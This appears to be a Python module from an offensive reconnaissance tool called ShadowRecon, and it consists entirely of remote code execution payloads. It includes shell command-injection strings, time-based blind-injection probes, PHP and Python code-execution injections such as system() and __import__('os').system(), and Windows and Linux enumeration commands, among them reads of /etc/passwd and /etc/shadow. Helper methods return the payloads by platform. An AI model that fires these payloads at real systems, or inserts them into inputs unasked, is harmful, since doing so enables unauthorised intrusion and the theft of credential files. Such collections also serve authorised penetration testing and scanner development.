
"""
Advanced RCE Payloads for ShadowRecon v1.0
Developed by kernelpanic | A product of infosbios

Comprehensive Remote Code Execution payload collection
"""

class RCEPayloads:
    """Advanced Remote Code Execution payload collection"""

    # Basic command injection
    BASIC_INJECTION = [
        '; whoami',
        '; id',
        '; pwd',
        '; ls',
        '; dir',
        '&& whoami',
        '&& id',
        '&& pwd',
        '&& ls',
        '&& dir',
        '| whoami',
        '| id',
        '| pwd',
        '| ls',
        '| dir',
        '`whoami`',
        '`id`',
        '`pwd`',
        '$(whoami)',
        '$(id)',
        '$(pwd)',
    ]

    # Time-based detection
    TIME_BASED_DETECTION = [
        '; sleep 5',
        '; ping -c 5 127.0.0.1',
        '&& sleep 5',
        '&& ping -c 5 127.0.0.1',
        '| sleep 5',
        '| ping -c 5 127.0.0.1',
        '`sleep 5`',
        '$(sleep 5)',
        '; timeout 5',
        '; ping -n 5 127.0.0.1',
        '&& timeout 5',
        '&& ping -n 5 127.0.0.1',
    ]

    # PHP code execution
    PHP_EXECUTION = [
        "'; system('whoami'); //",
        "'; exec('whoami'); //",
        "'; shell_exec('whoami'); //",
        "'; passthru('whoami'); //",
        "'; `whoami`; //",
        "'; eval('system(\"whoami\");'); //",
        "<?php system('whoami'); ?>",
        "<?php exec('whoami'); ?>",
        "<?php shell_exec('whoami'); ?>",
        "<?php passthru('whoami'); ?>",
        "<?php echo `whoami`; ?>",
        "<?=`whoami`?>",
        "<?=system('whoami')?>",
    ]

    # Python code execution
    PYTHON_EXECUTION = [
        "'; import os; os.system('whoami'); #",
        "'; __import__('os').system('whoami'); #",
        "'; exec('import os; os.system(\"whoami\")'); #",
        "'; eval('__import__(\"os\").system(\"whoami\")'); #",
        "__import__('os').system('whoami')",
        "exec('import os; os.system(\"whoami\")')",
        "eval('__import__(\"os\").system(\"whoami\")')",
        "'; subprocess.call('whoami', shell=True); #",
        "'; os.popen('whoami').read(); #",
    ]

    # Windows-specific payloads
    WINDOWS_SPECIFIC = [
        '; dir',
        '; whoami',
        '; net user',
        '; systeminfo',
        '; tasklist',
        '; ipconfig',
        '; net localgroup administrators',
        '; type C:\\windows\\system32\\drivers\\etc\\hosts',
        '; powershell -c Get-Process',
        '; wmic os get name',
        '&& dir',
        '&& whoami',
        '&& net user',
        '| dir',
        '| whoami',
        '| net user',
    ]

    # Linux-specific payloads
    LINUX_SPECIFIC = [
        '; ls -la',
        '; whoami',
        '; id',
        '; uname -a',
        '; cat /etc/passwd',
        '; cat /etc/shadow',
        '; ps aux',
        '; netstat -tulnp',
        '; cat /proc/version',
        '; cat /etc/issue',
        '&& ls -la',
        '&& whoami',
        '&& id',
        '| ls -la',
        '| whoami',
        '| id',
    ]

    @classmethod
    def get_all_payloads(cls) -> list:
        """Get all RCE payloads"""
        all_payloads = []
        all_payloads.extend(cls.BASIC_INJECTION)
        all_payloads.extend(cls.TIME_BASED_DETECTION)
        all_payloads.extend(cls.PHP_EXECUTION)
        all_payloads.extend(cls.PYTHON_EXECUTION)
        all_payloads.extend(cls.WINDOWS_SPECIFIC)
        all_payloads.extend(cls.LINUX_SPECIFIC)
        return all_payloads

    @classmethod
    def get_platform_payloads(cls, platform: str) -> list:
        """Get platform-specific payloads"""
        if platform.lower() == 'windows':
            return cls.WINDOWS_SPECIFIC + cls.BASIC_INJECTION
        elif platform.lower() == 'linux':
            return cls.LINUX_SPECIFIC + cls.BASIC_INJECTION
        else:
            return cls.BASIC_INJECTION
